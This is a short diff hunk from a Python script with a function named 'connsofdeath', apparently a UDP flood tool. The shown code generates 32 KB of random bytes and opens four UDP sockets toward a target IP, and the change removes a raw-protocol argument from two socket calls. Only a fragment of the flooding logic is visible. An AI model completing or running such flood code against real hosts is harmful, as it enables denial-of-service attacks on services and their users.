@@ -12,9 +12,9 @@ def connsofdeath(ip):
     bytesU = random._urandom(1024*32)
 
     conn1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    conn2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, IPPROTO_RAW)
+    conn2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     conn3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    conn4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, IPPROTO_RAW)
+    conn4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     r1 = random.randint(1, 1024)
     r2 = random.randint(1, 1024)
